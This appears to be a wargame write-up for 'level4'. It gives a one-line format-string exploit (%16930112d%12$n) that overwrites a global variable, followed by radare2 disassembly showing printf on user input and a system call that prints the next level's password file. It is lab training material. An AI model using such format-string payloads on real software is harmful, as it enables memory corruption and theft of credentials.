The previous method will be too long

There is a trick with the modifier "%d", "%XXXd" will get an XXX size int

We can generate our number of bytes like that

$ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4

```
[~]$ r2 level4
 -- Run a command with unspecified long sequence of 'a', pancake will be summoned and do the analysis for you.
[0x08048390]> pxc
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
0x08048390  31ed 5e89 e183 e4f0 5054 5268 3085 0408  1.^.....PTRh0...  ; eip  ; [13] -r-x section size 476 named .text
0x080483a0  68c0 8404 0851 5668 a784 0408 e8cf ffff  h....QVh........
0x080483b0  fff4 9090 9090 9090 9090 9090 9090 9090  ................
0x080483c0  5589 e553 83ec 0480 3d08 9804 0800 753f  U..S....=.....u?  ; sym.__do_global_dtors_aux
0x080483d0  a10c 9804 08bb 0897 0408 81eb 0497 0408  ................
0x080483e0  c1fb 0283 eb01 39d8 731e 8db6 0000 0000  ......9.s.......
0x080483f0  83c0 01a3 0c98 0408 ff14 8504 9704 08a1  ................
0x08048400  0c98 0408 39d8 72e8 c605 0898 0408 0183  ....9.r.........
0x08048410  c404 5b5d c38d 7426 008d bc27 0000 0000  ..[]..t&...'....
0x08048420  5589 e583 ec18 a10c 9704 0885 c074 12b8  U............t..  ; sym.frame_dummy
0x08048430  0000 0000 85c0 7409 c704 240c 9704 08ff  ......t...$.....
0x08048440  d0c9 c390 5589 e583 ec18 8b45 0889 0424  ....U......E...$  ; sym.p
0x08048450  e8eb feff ffc9 c355 89e5 81ec 1802 0000  .......U........  ; sym.n
0x08048460  a104 9804 0889 4424 08c7 4424 0400 0200  ......D$..D$....
0x08048470  008d 85f8 fdff ff89 0424 e8d1 feff ff8d  .........$......
0x08048480  85f8 fdff ff89 0424 e8b7 ffff ffa1 1098  .......$........
[0x08048390]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)       
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08048390]> s main
[0x080484a7]> pdda
    ; assembly                               | /* r2dec pseudo code output */
                                             | /* level4 @ 0x80484a7 */
                                             | #include <stdint.h>     
                                             |
    ; (fcn) main ()                          | int32_t main (void) {   
    0x080484a7 push ebp                      |
    0x080484a8 mov ebp, esp                  |
    0x080484aa and esp, 0xfffffff0           |
    0x080484ad call 0x8048457                |     n ();
    0x080484b2 leave                         |
    0x080484b3 ret                           |
                                             | }
[0x080484a7]> s sym.n
[0x08048457]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level4 @ 0x8048457 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.n ()                             | int32_t n (void) {
                                                 |     char * s;
                                                 |     int32_t size;
                                                 |     FILE * stream;
    0x08048457 push ebp                          |
    0x08048458 mov ebp, esp                      |     
    0x0804845a sub esp, 0x218                    |
    0x08048460 mov eax, dword [0x8049804]        |     eax = stdin;
    0x08048465 mov dword [esp + 8], eax          |     *((esp + 8)) = eax;
    0x08048469 mov dword [esp + 4], 0x200        |     *((esp + 4)) = 0x200;
    0x08048471 lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x08048477 mov dword [esp], eax              |
    0x0804847a call 0x8048350                    |     fgets (ebp);
    0x0804847f lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x08048485 mov dword [esp], eax              |
    0x08048488 call 0x8048444                    |     p (eax);
    0x0804848d mov eax, dword [0x8049810]        |     eax = *(obj.m);
    0x08048492 cmp eax, 0x1025544                |
                                                 |     if (eax == 0x1025544) {
    0x08048497 jne 0x80484a5                     |
    0x08048499 mov dword [esp], 0x8048590        |
    0x080484a0 call 0x8048360                    |         system ("/bin/cat /home/user/level5/.pass");
                                                 |     }
    0x080484a5 leave                             |
    0x080484a6 ret                               |     return eax;
                                                 | }
[0x08048457]> s sym.p
[0x08048444]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level4 @ 0x8048444 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.p ()                             | int32_t p (char * format) {
    0x08048444 push ebp                          |
    0x08048445 mov ebp, esp                      |
    0x08048447 sub esp, 0x18                     |
    0x0804844a mov eax, dword [ebp + 8]          |     eax = *((ebp + 8));
    0x0804844d mov dword [esp], eax              |
    0x08048450 call 0x8048340                    |     printf (eax);
    0x08048455 leave                             |
    0x08048456 ret                               |     return eax;
                                                 | }
[0x08048444]>
```